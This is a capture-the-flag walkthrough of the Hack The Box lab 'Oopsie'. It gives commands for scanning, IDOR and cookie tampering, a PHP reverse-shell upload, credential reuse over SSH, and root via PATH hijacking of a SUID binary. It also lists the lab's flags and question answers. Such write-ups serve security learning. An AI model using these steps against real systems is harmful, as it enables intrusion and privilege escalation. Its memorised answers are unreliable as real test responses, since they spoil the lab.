# Oopsie!

> IP: [10.129.40.54]

## NOTES / STEPS

1. Deploy Machine
2. NMAP
   1. > nmap -sC -sV 10.129.40.54 -oN init_scan
      1. Port 22 -> ssh -> OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
      2. Port 80 -> http -> Apache httpd 2.4.29
3. HTTP
   1. Navigate to website
      1. Scrolling through we see an email with the domain "megacorp.com"
   2. GOBUSTER
      1. > gobuster dir -x php,txt,html -u http://10.129.40.54/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
         1. /images
         2. /themes
         3. /uploads
4. BURPSUITE
   1. Target -> http://10.129.40.54/
      1. CRAWL
         1. /cdn-cgi/login/script.js
5. HTTP Pt.2
   1. Going to the login form we see that there is a guest login
      1. We now have access to the dashboard, however we need admin permissions to be able to access the upload feature
   2. Go to the ACCOUNT's page we see our guest user, and their id, but more importantly we see the url:
      1. "http://10.129.40.54/cdn-cgi/login/admin.php?content=accounts&id=2"
         1. If we change the id value maybe we will get a different user
      2. "http://10.129.40.54/cdn-cgi/login/admin.php?content=accounts&id=1"
         1. SUCCESS! We see admin, with the userID = `34322`
   3. COOKIE
      1. Looking at the session cookie we see
         1. ROLE:guest
         2. USER:2233
      2. So we should be able to change the role and id to get admin privileges
         1. UN:admin
         2. USER:34322
            1. Refresh the page - and we now have access to the file uploader
6. EXPLOIT
   1. Lets try an upload a htb-revshell.php
   2. Browse -> Upload -> success
   3. Now we need to setup a netcat listner
      1. > nc -lnvp 1234
   4. From our previous gobuster scan we know there is an /uploads/ directory
      1. Navigate to /uploads/htb-revshell.php
         1. SUCCESS! We now have a revshell
7. ENUMERATION
   1. Check website (/var/www/html) directories for sensitive information
      1. > cat /var/www/html/cdn-cgi/login/db.php

            ```php
                $conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
            ```

            1. In here we see a connection to a database with the username:robert and password:M3g4C0rpUs3r!
            2. Maybe these credentials allow us to escalate 
   2. Check user's home directories
      1. > ls /home
         1. robert
         2. > ls /home/robert
            1. user.txt
8. SSH
   1. Going back to our original nmap scan we saw port 22 -> ssh was open so lets try ssh'ing in as robert with the credentials we found
      1. > ssh robert@10.129.40.54
         1. PW: M3g4C0rpUs3r!
         2. SUCCESS!
9. ENUMERATION PT.2
   1. ROBERT
      1. Now we can get the user.txt flag
         1. > cat user.txt
            1. `f2c74ee8db7983851ab2a96a44eb7981`
   2. LINPEAS
      1. SUID
         1. -rwsr-xr-- 1 root bugtracker 8.6K Jan 25  2020 /usr/bin/bugtracker (Unknown SUID binary!)
         2. We see an unknown binary and it is owned by root and bugtracker group, BUT it has a SUID or stickybit
   3. BUGTRACKER
      1. Lets explore this binary
         1. Run the binary
            1. > bugtracker 
               1. ID: anything
                  1. ERROR: "cat: /root/reports/10: No such file or directory"
                  2. So we can see that cat is being called (without the full path)
10. EXPLOIT
   1. So we know that the CAT command is being ran but it doesn't have the full path specified so we can hijack this and make our own cat binary
   2. Create the binary
      1. > echo '/bin/bash' > cat
   3. Make it executable
      1. > chmod +x cat
   4. Add our user's home directory to the PATH
      1. > export PATH=/home/$USER:$PATH
   5. Now run our bugtracker binary
      1. > bugtracker
      2. > whoami
         1. root
   6. FLAG
      1. Have to use the FULL path of the cat binary now, otherwise we will keep calling our exploited one
      2. > /bin/cat /root/root.txt
         1. FLAG: `af13b0bee69f8a877c3faf667f7beacf`

## QUESTIONS

1. With what kind of tool can intercept web traffic? (I use burpsuite but had to look up the exact software for this question's answer)
   1. `proxy`
2. What is the path to the directory on the webserver that returns a login page?
   1. `/cdn-cgi/login/`
3. What can be modified in Firefox to get access to the upload page?
   1. `cookie`
4. What is the access ID of the admin user?
   1. `34322`
5. On uploading a file, what directory does that file appear in on the server?
   1. `/uploads`
6. What is the file that contains the password that is shared with the robert user?
   1. `db.php`
7. What executible is run with the option "-group bugtracker" to identify all files owned by the bugtracker group?
   1. `find`
8. Regardless of which user starts running the bugtracker executable, what's user privileges will use to run?
   1. `root`
9. What SUID stands for?
   1. `set owner user id`
10. What is the name of the executable being called in an insecure manner?
   1. `cat`
11. Submit user flag
   1. `f2c74ee8db7983851ab2a96a44eb7981`
12. Submit root flag
   1. `af13b0bee69f8a877c3faf667f7beacf`
